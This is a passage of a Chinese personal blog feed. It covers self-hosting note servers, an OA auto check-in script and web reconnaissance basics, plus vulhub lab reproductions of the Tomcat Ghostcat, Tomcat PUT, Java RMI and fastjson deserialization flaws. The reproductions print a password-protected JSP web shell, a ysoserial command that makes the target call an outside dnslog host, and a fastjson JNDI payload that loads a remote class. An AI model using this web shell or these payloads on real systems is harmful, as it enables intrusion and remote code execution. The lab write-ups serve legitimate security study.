9269:9269/udp  wiznote/wizserver</p><p>系统重启后启动wiznote<br>docker start wiz</p><p>查看容器绑定和映射的端口及Ip地址<br>docker port 44de1b0b5312(容器ID)</p><p>默认管理员账号：<a href="mailto:admin@wiz.cn">admin@wiz.cn</a>，密码：123456。请在部署完成后，使用这个账号，登录网页版，然后修改管理员密码。其他用户，请自行注册。免费版本可以注册5个用户（不包含管理员账号）</p><p><img src="https://s1.ax1x.com/2020/08/25/d6A6Yt.png" alt="d6A6Yt.png"></p><p>参考文档：<a href="https://www.wiz.cn/zh-cn/docker" target="_blank" rel="noopener">https://www.wiz.cn/zh-cn/docker</a><br>         <a href="https://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">https://www.runoob.com/docker/ubuntu-docker-install.html</a><br>         <a href="https://hub.docker.com/search?q=&amp;type=edition&amp;offering=community&amp;operating_system=linux" target="_blank" rel="noopener">https://hub.docker.com/search?q=&amp;type=edition&amp;offering=community&amp;operating_system=linux</a></p><hr><h2 id="leanote云笔记"><a href="#leanote云笔记" class="headerlink" title="leanote云笔记"></a>leanote云笔记</h2><p>使用wiznote搭建公网访问的云笔记过于麻烦，于是又找到了leanote。现在开始部署。</p><h3 id="下载MongoDB数据库"><a href="#下载MongoDB数据库" class="headerlink" title="下载MongoDB数据库"></a>下载MongoDB数据库</h3><p>下载源码：<code>wget http://labs-1253675457.cosgz.myqcloud.com/mongodb-linux-x86_64-3.0.1.tgz</code></p><p>解压缩源码包：<code>tar -xzvf mongodb-linux-x86_64-3.0.1.tgz</code><br>创建用于存储的文件夹目录：<code>mkdir -p /data/db</code></p><p>配置 MongoDB 的环境变量：<br>编辑 /etc/profile，在文件末尾追加以下配置：</p><pre><code>export PATH=$PATH:/home/mongodb-linux-x86_64-3.0.1/bin</code></pre><p>执行以下命令，使环境变量生效：<code>source /etc/profile</code><br>启动 MongoDB：<code>mongod --bind_ip localhost --port 27017 --dbpath /data/db/ --logpath=/var/log/mongod.log --fork</code></p><h3 id="安装Leanote"><a href="#安装Leanote" class="headerlink" title="安装Leanote"></a>安装Leanote</h3><p>下载源码：<code>wget http://labs-1253675457.cosgz.myqcloud.com/leanote-linux-amd64-v2.4.bin.tar.gz</code></p><p>解压缩：<code>tar -zxvf leanote-linux-amd64-v2.4.bin.tar.gz</code></p><p>编辑 Leanote 配置文件</p><p>编辑文件 <code>/home/leanote/conf/app.conf</code>，在文件中找到 <code>app.secret=</code>项，并修改为如下内容：</p><pre><code>app.secret=qcloud666</code></pre><p>初始化数据库</p><p>导入初始化数据：<code>mongorestore -h localhost -d leanote --dir /home/admin/leanote/mongodb_backup/leanote_install_data/</code></p><p>启动服务：<code>nohup /bin/bash /home/admin/leanote/bin/run.sh &gt;&gt; /var/log/leanote.log 2&gt;&amp;1 &amp;</code></p><p>查看日志文件： <code>tail -f leanote.log</code></p><p>参考资料：<a href="https://blog.csdn.net/weixin_41360517/article/details/98790419" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41360517/article/details/98790419</a></p><hr><h2 id="vulhub"><a href="#vulhub" class="headerlink" title="vulhub"></a>vulhub</h2><p>ubuntu下载docker<br>curl -fsSL <a href="https://get.docker.com" target="_blank" rel="noopener">https://get.docker.com</a> | bash -s docker –mirror Aliyun</p><p>将用户添加到docker组<br>sudo usermod -aG docker admin</p>]]></content>
      
      
      
        <tags>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Aapache Tomcat AJP 文件包含漏洞（CVE-2020-1938）</title>
      <link href="/2020/07/19/Aapache-Tomcat-AJP%EF%BC%88CVE-2020-1938%EF%BC%89/"/>
      <url>/2020/07/19/Aapache-Tomcat-AJP%EF%BC%88CVE-2020-1938%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Tomcat-AJP-文件包含漏洞（CVE-2020-1938）"><a href="#Apache-Tomcat-AJP-文件包含漏洞（CVE-2020-1938）" class="headerlink" title="Apache Tomcat AJP 文件包含漏洞（CVE-2020-1938）"></a>Apache Tomcat AJP 文件包含漏洞（CVE-2020-1938）</h1><p>Java 是目前 Web 开发中最主流的编程语言，而 Tomcat 是当前最流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。</p><p><a href="https://www.chaitin.cn/zh/ghostcat" target="_blank" rel="noopener">Ghostcat（幽灵猫）</a> 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动一个Tomcat 9.0.30：</p><pre><code>docker-compose up -d</code></pre><p>环境启动后，访问<code>http://your-ip:8080</code>即可查看tomcat默认页面，此时通过AJP协议的8009端口亦可访问Tomcat。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>利用如下工具均可测试漏洞：</p><ul><li><a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">https://github.com/chaitin/xray</a></li><li><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></li></ul><p><code>\Desktop\CNVD-2020-10487-Tomcat-Ajp-lfi-master&gt;python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.10.128 -p 8009 -f WEB-INF/web.xml</code></p><p><img src="https://s1.ax1x.com/2020/07/19/UWSD2Q.png" alt="UWSD2Q.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</title>
      <link href="/2020/07/15/Tomcat-PUT%EF%BC%88CVE-2017-12615%EF%BC%89/"/>
      <url>/2020/07/15/Tomcat-PUT%EF%BC%88CVE-2017-12615%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h1><p>Tomcat版本：8.5.19</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre><code>docker-compose builddocker-compose up -d</code></pre><p>运行完成后访问<code>http://your-ip:8080</code>即可看到Tomcat的Example页面。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>jsp有回显带密码验证的一句话木马</p><p><img src="https://s1.ax1x.com/2020/07/15/U0u4ld.png" alt="U0u4ld.png"></p><pre><code>&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))){java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);while((a=in.read(b))!=-1){out.println(new String(b));}out.print(&quot;&lt;/pre&gt;&quot;);}%&gt;请求：http://192.168.16.240:8080/Shell/cmd2.jsp?pwd=023&amp;i=ls</code></pre><p><img src="https://s1.ax1x.com/2020/07/15/U0u70P.png" alt="U0u70P.png"></p><p>完。</p><p>参考文章：<a href="https://www.debugger.wiki/article/html/1570928400169147" target="_blank" rel="noopener">https://www.debugger.wiki/article/html/1570928400169147</a></p><p><a href="https://cloud.tencent.com/developer/article/1468772" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1468772</a></p><p><a href="https://www.cnblogs.com/leixiao-/p/10264236.html" target="_blank" rel="noopener">https://www.cnblogs.com/leixiao-/p/10264236.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java RMI Registry 反序列化漏洞</title>
      <link href="/2020/07/15/Java-RMI-Registry/"/>
      <url>/2020/07/15/Java-RMI-Registry/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-RMI-Registry-反序列化漏洞-lt-jdk8u111"><a href="#Java-RMI-Registry-反序列化漏洞-lt-jdk8u111" class="headerlink" title="Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)"></a>Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)</h1><p>Java Remote Method Invocation 用于在Java中进行远程调用。RMI存在远程bind的功能(虽然大多数情况不允许远程bind)，在bind过程中，伪造Registry接收到的序列化数据(实现了Remote接口或动态代理了实现了Remote接口的对象)，使Registry在对数据进行反序列化时触发相应的利用链(环境用的是commons-collections:3.2.1).</p><h2 id="搭建Java-RMI-Registry环境，RMIIP为虚拟机IP。"><a href="#搭建Java-RMI-Registry环境，RMIIP为虚拟机IP。" class="headerlink" title="搭建Java RMI Registry环境，RMIIP为虚拟机IP。"></a>搭建Java RMI Registry环境，RMIIP为虚拟机IP。</h2><pre><code>cd /root/vulhub/java/rmi-registry-bind-deserialization/docker-compose build# 启动环境docker-compose run -e RMIIP=192.168.1.160 -p 1099:1099 rmi</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><pre><code># 在ysoserial目录下执行java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.160.128 1099 CommonsCollections6 &quot;curl http://hq7rcl.dnslog.cn&quot;</code></pre><p>在线查询连接请求。在线工具：<a href="http://dnslog.cn/" target="_blank" rel="noopener">http://dnslog.cn/</a></p><p><img src="https://s1.ax1x.com/2020/07/15/U0nWMn.png" alt="U0nWMn.png"></p><p>连接结果</p><p><img src="https://s1.ax1x.com/2020/07/15/U0nhq0.png" alt="U0nhq0.png"></p><p>执行创建文件的命令</p><p><img src="https://s1.ax1x.com/2020/07/15/U0nXs1.png" alt="U0nXs1.png"></p><p>查看docker中创建的文件。</p><p><img src="https://s1.ax1x.com/2020/07/15/U0njqx.png" alt="U0njqx.png"></p><p>漏洞复现成功。</p><p>参考资料：<a href="https://github.com/vulhub/vulhub/tree/master/java/rmi-registry-bind-deserialization" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/java/rmi-registry-bind-deserialization</a></p><p>​                  <a href="https://blog.csdn.net/JiangBuLiu/article/details/95492587" target="_blank" rel="noopener">https://blog.csdn.net/JiangBuLiu/article/details/95492587</a></p><p>​                  <a href="https://vulhub.org/#/environments/jmeter/CVE-2018-1297/" target="_blank" rel="noopener">https://vulhub.org/#/environments/jmeter/CVE-2018-1297/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson 1.2.24 反序列化导致任意命令执行漏洞</title>
      <link href="/2020/07/14/fastjson1-2-24/"/>
      <url>/2020/07/14/fastjson1-2-24/</url>
      
        <content type="html"><![CDATA[<h1 id="fastjson-1-2-24-反序列化导致任意命令执行漏洞"><a href="#fastjson-1-2-24-反序列化导致任意命令执行漏洞" class="headerlink" title="fastjson 1.2.24 反序列化导致任意命令执行漏洞"></a>fastjson 1.2.24 反序列化导致任意命令执行漏洞</h1><p>ubuntu安装curl。<br>apt install curl</p><h2 id="docker环境部署"><a href="#docker环境部署" class="headerlink" title="docker环境部署"></a>docker环境部署</h2><p>下载安装docker<br>curl -fsSL <a href="https://get.docker.com" target="_blank" rel="noopener">https://get.docker.com</a> | bash -s docker –mirror Aliyun</p><p>将普通用户添加到docker用户组<br>sudo usermod -aG docker duyada<br>cat /etc/group |grep docker</p><h2 id="vulhub靶机搭建"><a href="#vulhub靶机搭建" class="headerlink" title="vulhub靶机搭建"></a>vulhub靶机搭建</h2><p>安装compose<br>apt install docker-compose</p><p>下载vulhub项目<br>wget <a href="https://github.com/vulhub/vulhub/archive/master.zip" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/archive/master.zip</a> -O vulhub-master.zip</p><p>解压缩<br>unzip vulhub-master.zip</p><h3 id="靶机的使用"><a href="#靶机的使用" class="headerlink" title="靶机的使用"></a>靶机的使用</h3><p>选择某一个漏洞环境的目录<br>cd vulhub-master<br>cd fastjson/<br>ls<br>cd 1.2.24-rce/<br>ls</p><p>自动化编译环境<br>docker-compose build</p><p>启动整个环境<br>docker-compose up -d</p><hr><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>环境运行后，访问<a href="http://192.168.1.128:8090" target="_blank" rel="noopener">http://192.168.1.128:8090</a></p><p><img src="https://s1.ax1x.com/2020/07/14/UU6nIg.png" alt="UU6nIg.png"></p><p>我们向这个地址POST一个JSON对象，即可更新服务端的信息。确认是使用json解析的。</p><pre><code>curl http://192.168.1.128:8090/ -H &quot;Content-Type: application/json&quot; --data &#39;{&quot;name&quot;:&quot;hello&quot;, &quot;age&quot;:20}&#39;</code></pre><p><img src="https://s1.ax1x.com/2020/07/14/UU6NoF.png" alt="UU6NoF.png"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>因为目标环境是Java 8u102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链，借助JNDI注入来执行命令。</p></blockquote><p>首先编译命令执行代码TouchFile.java。<code>D:\tf&gt; javac .\TouchFile.java</code>编译生成<code>TouchFile.class</code>文件。</p><pre><code>// javac TouchFile.javaimport java.lang.Runtime;import java.lang.Process;public class TouchFile {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {&quot;touch&quot;, &quot;/tmp/success&quot;};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}</code></pre><p>然后我们借助<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>项目，下载marshalsec工具，用来开启RMI&amp;LDAP，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p><p><a href="https://github.com/MagicZer0/fastjson-rce-exploit/blob/master/marshalsec-0.0.3-SNAPSHOT-all.jar" target="_blank" rel="noopener">https://github.com/MagicZer0/fastjson-rce-exploit/blob/master/marshalsec-0.0.3-SNAPSHOT-all.jar</a></p><p>在文件路径cmd中运行以下命令：</p><pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.1.1:8000/#TouchFile&quot; 9999</code></pre><blockquote><p>错误: 找不到或无法加载主类 marshalsec.jndi.RMIRefServer</p><p>原因：包名和marshalsec-0.0.3-SNAPSHOT-all.jar不在同一路径中</p><p>参考文章：<a href="https://zhidao.baidu.com/question/1690731339477414628.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/1690731339477414628.html</a></p></blockquote><p>用marshalsec开启RMI服务</p><p><img src="https://s1.ax1x.com/2020/07/14/UUcHj1.png" alt="UUcHj1.png"></p><p>使用python3搭建http服务，注意路径。</p><pre><code>python3 -m http.server 80</code></pre><p><img src="https://s1.ax1x.com/2020/07/14/UUgVUS.png" alt="UUgVUS.png"></p><p>使用bp软件抓包，修改请求内容。向靶场服务器发送Payload，带上RMI的地址：</p><pre><code>POST / HTTP/1.1                           #GET请求改为POSTHost: 192.168.1.128:8090Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: closeContent-Type: application/jsonContent-Length: 156{   &quot;b&quot;:{       &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,       &quot;dataSourceName&quot;:&quot;rmi://192.168.1.1:9999/TouchFile&quot;,       &quot;autoCommit&quot;:true   }}</code></pre><p>向靶机发送请求。</p><p><img src="https://s1.ax1x.com/2020/07/14/UUgn3j.png" alt="UUgn3j.png"></p><p>发送payload攻击包，rmi收到请求</p><p><img src="https://s1.ax1x.com/2020/07/14/UUgQuq.png" alt="UUgQuq.png"></p><p>http服务接收到请求，返回404，连接失败</p><p><img src="https://s1.ax1x.com/2020/07/14/UUg1bV.png" alt="UUg1bV.png"></p><p>切换路径到d:\tf再次发送payload。返回200，连接成功</p><p><img src="https://s1.ax1x.com/2020/07/14/UUg8ET.png" alt="UUg8ET.png"></p><p>去docker容器中查看命令已经成功执行。命令<code>touch /tmp/success</code>执行成功。</p><p><img src="https://s1.ax1x.com/2020/07/14/UUgJ5F.png" alt="UUgJ5F.png"></p><p>完。</p><p>测试完成后，删除整个环境<br>docker-compose down -v</p><p>参考资料：<a href="https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce</a></p><p>​                  <a href="https://www.yuque.com/m1tang/gqsay7/szhpyy" target="_blank" rel="noopener">https://www.yuque.com/m1tang/gqsay7/szhpyy</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现自动化签到</title>
      <link href="/2020/07/09/python-1/"/>
      <url>/2020/07/09/python-1/</url>
      
        <content type="html"><![CDATA[<h2 id="实现自动化签到"><a href="#实现自动化签到" class="headerlink" title="实现自动化签到"></a>实现自动化签到</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在OA上签到打卡和签退，但是总有些时候会忘记打卡，每天签到签退又很麻烦，于是就想到通过脚本实现自动化签到签退。</p><h3 id="获取请求包信息"><a href="#获取请求包信息" class="headerlink" title="获取请求包信息"></a>获取请求包信息</h3><p>首先打开网页打开F12，点击<code>Network</code>，点击<code>签到</code>。会出现一些请求文件，打开并查看<code>Headers</code>，查看<code>preview</code>显示得是返回的信息。</p><p>请求包内容，<code>request headers</code></p><pre><code>&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,&#39;Referer&#39;: &#39;从哪个网页跳转过来的&#39;,&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&#39;,&#39;Cookie&#39;: &#39;&#39;</code></pre><p>查看是<code>GET</code>请求还是<code>POST</code>请求。</p><h3 id="签到脚本"><a href="#签到脚本" class="headerlink" title="签到脚本"></a>签到脚本</h3><pre><code class="python">import requestsimport timeurl = &#39;http://xxx/hrm/schedule/HrmScheduleSignXMLHTTP.jsp?t=0.2655744879360351&#39;headers = {    &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,    &#39;Referer&#39;: &#39;http://xxx/wui/main.jsp&#39;,    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&#39;,    &#39;Cookie&#39;: &#39;xxx&#39;}response = requests.post(url=url,headers=headers)print(response.text)</code></pre><p>签到返回内容</p><p><img src="https://s1.ax1x.com/2020/07/09/UeBhdA.png" alt="UeBhdA.png"></p><p>签到成功。</p><p>添加日志功能，只记录了运行时间。这个脚本还不够完美。</p><pre><code class="python">import requestsimport timeimport reurl = &#39;http://xxx/hrm/schedule/HrmScheduleSignXMLHTTP.jsp?t=0.2655744879360351&#39;headers = {    &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,    &#39;Referer&#39;: &#39;http://xxx/wui/main.jsp&#39;,    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&#39;,    &#39;Cookie&#39;: &#39;&#39;}response = requests.post(url=url,headers=headers)now = time.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;,time.localtime())msg = response.texttime = re.findall(r&#39;&lt;tr&gt;(.+?)&lt;/tr&gt;&#39;,msg)print(time)try:    with open(&#39;/home/admin/oa/log/log.txt&#39;,&#39;a&#39;) as f:        f.write(&#39;{} --- {}\n&#39;.format(now,time))        f.close()        print(response.text)except Exception as e:    print(e)</code></pre><p>运行成功后，测试。</p><h3 id="设置定时任务"><a href="#设置定时任务" class="headerlink" title="设置定时任务"></a>设置定时任务</h3><p>编辑<code>/etc/crontab</code>文件。</p><blockquote><p>30 8    * * 1-5 root    sh /home/admin/oa/oa.sh</p><p>每周一到周五的8点半运行这个脚本。</p></blockquote><p>查看记录的日志文件。</p><p><img src="https://s1.ax1x.com/2020/07/09/UeHhjg.png" alt="UeHhjg.png"></p><p>自动签到部分大功告成。</p><hr><h3 id="自动签退"><a href="#自动签退" class="headerlink" title="自动签退"></a>自动签退</h3><p>点击签退，抓包，获得签退时的请求链接。</p><p><img src="https://s1.ax1x.com/2020/07/09/Un8UQs.png" alt="Un8UQs.png"></p><p>修改脚本请求的链接即可完成签退脚本。</p><pre><code class="python">import requestsimport timeimport reurl = &#39;http://xxx/hrm/schedule/HrmScheduleSignXMLHTTP.jsp?t=0.961868599700483&#39;headers = {    &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,    &#39;Referer&#39;: &#39;http://xxx/wui/main.jsp&#39;,    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&#39;,    &#39;Cookie&#39;: &#39;xxx&#39;}response = requests.post(url=url,headers=headers)now = time.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;,time.localtime())msg = response.texttime = re.findall(r&#39;&lt;tr&gt;(.+?)&lt;/tr&gt;&#39;,msg)print(time)try:    with open(&#39;/home/admin/oa/log/log.txt&#39;,&#39;a&#39;) as f:        f.write(&#39;{} ---quit success {}\n&#39;.format(now,time))        f.close()        print(response.text)except Exception as e:    print(e)</code></pre><p>查看运行后的日志记录</p><p><img src="https://s1.ax1x.com/2020/07/09/UnGF6s.png" alt="UnGF6s.png"></p><p>测试完成。添加到定时任务中。</p><p>完。</p>]]></content>
      
      
      
        <tags>
            
            <tag> bash </tag>
            
            <tag> python </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web基本概念</title>
      <link href="/2020/07/07/web-1/"/>
      <url>/2020/07/07/web-1/</url>
      
        <content type="html"><![CDATA[<h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><p>一、域名简介</p><p>为了便于我们访问服务器，就有了域名的诞生。域名和IP地址的关系就相当于姓名和身份证号之间的关系。域名是为了方便记忆。</p><p> 二、域名查询</p><p>1、根据域名我们可以查询一些服务器的信息，比如ip地址，管理员的部分信息。</p><p>2、推荐网址：<a href="http://tool.chinaz.com" target="_blank" rel="noopener">http://tool.chinaz.com</a></p><p><a href="https://www.aizhan.com" target="_blank" rel="noopener">https://www.aizhan.com</a></p><p> 三、子域名收集</p><p>.com 顶级域名</p><p>baidu.com 二级域名</p><p>m.baidu.com 三级域名</p><p>一个服务器上可以搭建多个网站，所有就有许多域名对应一个IP地址，想找这个服务器上的漏洞，可以从多个网站入手，这就是子域名收集的重要性。</p><h3 id="CMS识别"><a href="#CMS识别" class="headerlink" title="CMS识别"></a>CMS识别</h3><p>打开一个网站，我们可以先看一下该网站的CMS，</p><p>推荐使用在线识别工具：</p><p><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a></p><p><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a></p><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><p>一个服务器可以对应多个域名，同样也可以对应多个端口，比如：192.168.1.111:80 192.168.1.111:82，不同端口可以搭建不同网站。</p><hr><p>常见端口：</p><p>HTTP协议代理服务器：80/8080/3128/8081/9080</p><p>FTP文件传输协议:21</p><p>Telnet远程登录协议:23</p><p>TFTP协议:69/udp</p><p>SMTP(E-mail): 25/tcp</p><p>POP3:110/tcp</p><p>TOMCAT:8080</p><p>win2003远程登录:3389</p><p>Oracle数据库:1521</p><p>MS SQL SERVER:1433/tcp/udp</p><p>QQ: 1080/udp</p><p>SSH安全登录、SCP文件传输、端口重定向：22/tcp</p><hr><p>查看服务器开放工具：masscan，nmap</p><h3 id="搜索引擎语法"><a href="#搜索引擎语法" class="headerlink" title="搜索引擎语法"></a>搜索引擎语法</h3><p>一、Google搜索</p><p>site:baidu.com  可以查看子域名</p><p>inurl:.php?id= 搜索我们指定的字符是否存在于URL中</p><p>intext:管理 将返回所有在网页正文部分包含关键词的网页</p><p>intitle: 管理 将返回所有网页标题中包含关键词的网页</p><p>filetype:txt 搜索指定的文件类型</p><p>“精准查找” 引号里面的内容是精准查找的</p><p>aiyou -bucuo 搜索有aiyou，但是排除带bucuo的内容</p><p>link:baidu.com 可以返回所有和baidu.com做了链接的URL。</p><p>二、fofa搜索</p><p>title=”abc” 从标题中搜索abc</p><p>header=”abc” 从http头中搜索abc</p><p>body=”abc” 从html正文中搜索abc</p><p>domain=”qq.com” 搜索根域名带有qq.com的网站</p><p>host=”.gov.cn” 从url中搜索.gov.cn,注意搜索要用host作为名称</p><p>port=”443” 查找对应443端口</p><p>ip=”1.1.1.1” 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称</p><p>protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)</p><p>city=”Beijing” 搜索指定城市</p><p>region=”Zhejiang” 搜索指定行政区</p><p>country=”CN” 搜索指定国家(编码)</p><p>三、钟馗之眼</p><p>app:nginx 组件名</p><p>ver:1.0 版本</p><p>os:windows 操作系统</p><p>country:”China” 国家</p><p>city:”hangzhou” 城市</p><p>port:80 端口</p><p>vhostname:google 主机名</p><p>`site:thief.onev 网站域名</p><p>desc:nmask 描述</p><p>keywords:nmask’blog 关键词</p><p>service:ftpv 服务类型</p><p>ip:8.8.8.8 ip地址</p><p>cidr:8.8.8.8/24 ip地址段</p><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>CDN：当一个服务器被不同地方的客户端大量访问的时候，服务器可能会出现压力，为了减小这些压力，就有CDN的出现。还有一个作用就是隐藏真实IP。</p><p>一、判断CDN是否存在</p><p>我们可以随便ping一下网址，得到一个IP地址，然后把这个IP直接放到浏览器，看是否能正常该网站，如果能说明没有CDN防护。</p><p>二、绕过CDN</p><p>1、通过站长工具的多地ping</p><p>2、通过ping子域名，一般网站只在主站挂CDN</p><p>在线查询：</p><p><a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a></p><p><a href="https://viewdns.info/" target="_blank" rel="noopener">https://viewdns.info/</a></p><p><a href="http://ping.chinaz.com" target="_blank" rel="noopener">http://ping.chinaz.com</a> </p><h3 id="mysql语法"><a href="#mysql语法" class="headerlink" title="mysql语法"></a>mysql语法</h3><p>一、基本语法</p><p>show databases(); 显示当前数据库</p><p>show user()；显示当前用户</p><p>show now()；显示当前时间</p><p>use 数据库名称；选择数据库</p><p>show tables；显示选择的数据的所有表</p><p>show create table users \G;显示表结构的详细数据</p><p>DESCribe 表名；显示表结构，大写可以自动补全</p><p>select * from users；查询所有数据</p><p>select id,name from users; 查询两列表</p><p>select * from users where id=‘2’； 如果不加引号表示字段名称，加上引号表示字段内容</p><p>limit 3 限制显示3行</p><p>select DISTINCT 表名 去重复的名字</p><p>select database() 显示当前数据库</p><p>select version 显示数据库版本</p><p>select user() 显示当前用户</p><p>二、增删改查</p><p>select 列名称 from 表名称 where 字段1=’条件1’ and 字段2=’条件2’</p><p>insert into 表名(列1，列2.。。)values（值1，值2）</p><p>update 表名称 set 列名称=新值 where 列名称=某值</p><p>delete from 表名称 where 列名称=值</p><p>三、注释</p><p>–空格</p><p>#</p><p>/**/</p><p>四、mysql5.0以上版本的特性：</p><p>默认定义information_schema数据库，里面具有表schemata(数据库名)、tables(表名)、columns(列名或字段名)</p><p>在schemata表中，schema_name字段用来存储数据库名</p><p>在tables表中，table_schema和table_name分别用来存储数据库名。</p><p>在columns表中，tabel_schema存储数据库名，table_name存储表名，column_name存储字段名</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>考前须知</title>
      <link href="/2020/06/29/%E8%80%83%E5%89%8D%E9%A1%BB%E7%9F%A5/"/>
      <url>/2020/06/29/%E8%80%83%E5%89%8D%E9%A1%BB%E7%9F%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="考前须知"><a href="#考前须知" class="headerlink" title="考前须知"></a>考前须知</h3><p><code>**********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************</code></p><ul><li>河南人事网报名网站：<a href="http://www.hnrsks.com/LinkPage/News_list.aspx?dict_id=d_sgwyzt&amp;dict_values=A&amp;_d_id=1b335f82e8f8f17e4209556eec8515" target="_blank" 